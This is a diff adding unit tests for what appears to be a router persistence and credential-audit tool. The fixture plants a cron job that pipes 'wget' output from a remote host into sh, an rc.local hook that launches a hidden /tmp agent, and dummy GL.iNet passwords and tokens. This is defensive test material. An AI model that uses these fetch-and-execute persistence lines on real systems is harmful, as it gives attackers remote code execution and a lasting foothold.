@@ -422,5 +422,47 @@ printf 'Port 2200\nPermitRootLogin yes\n#PasswordAuthentication no\n' > /etc/ssh
         self.assertIn(fingerprint(ED_BLOB), text)
 
 
+class TestReviewFindings(Fixture):
+    """Round 3: what an independent review found in persistence and users_auth."""
+
+    SETUP = r"""
+set -e
+# F2: autostart files that are links to the RAM disk
+echo '*/5 * * * * wget -qO- http://203.0.113.5/x | sh' > /tmp/.c
+rm -f /etc/crontabs/root && ln -s /tmp/.c /etc/crontabs/root
+printf '/tmp/.cache/agent &\nexit 0\n' > /tmp/.rc
+rm -f /etc/rc.local && ln -s /tmp/.rc /etc/rc.local
+# F9: GL.iNet configuration with secrets
+echo 4.5.16 > /etc/glversion
+printf "config general 'general'\n\toption password 'glsecret111'\n\toption cloud_token 'cloudtok222'\n\toption lang 'en'\n" > /etc/config/glconfig
+"""
+
+    def test_persistence_shows_what_a_link_points_at(self):
+        text = self.tool_ok("persistence", ROM, locations=["cron", "rc_local"])
+        self.assertIn("/etc/crontabs/root -> /tmp/.c", text)
+        self.assertIn("*/5 * * * * wget -qO- http://203.0.113.5/x | sh", text)
+        self.assertIn("[CHANGED] /etc/rc.local -> /tmp/.rc", text)
+        self.assertIn("/tmp/.cache/agent &", text)
+
+    def test_one_flooded_location_does_not_hide_the_others(self):
+        # F7: the scan used to stop after 5000 entries, whatever location they were in
+        self.sh("mkdir -p /etc/cron.d && cd /etc/cron.d && seq 1 5200 | sed 's/^/f/' | xargs touch && "
+                "printf '#!/bin/sh\\n/tmp/up\\n' > /etc/uci-defaults/zz-late")
+        try:
+            text = self.tool_ok("persistence", ROM, max_lines=0)
+            self.assertIn("[new] /etc/uci-defaults/zz-late", text)
+            self.assertRegex(text, r"note: more than \d+ entries in cron; only the first \d+ were examined")
+        finally:
+            self.sh("rm -rf /etc/cron.d /etc/uci-defaults/zz-late")
+
+    def test_users_auth_masks_whatever_the_redaction_setting(self):
+        for env in (ROM, {"MCP_ROM": ROM_DIR, "MCP_REDACT": "0"}):
+            text = self.tool_ok("users_auth", env)
+            self.assertIn("GL.iNet web interface", text)
+            self.assertIn("glconfig.general.password=", text)
+            self.assertNotIn("glsecret111", text)
+            self.assertNotIn("cloudtok222", text)
+
+
 if __name__ == "__main__":
     unittest.main()
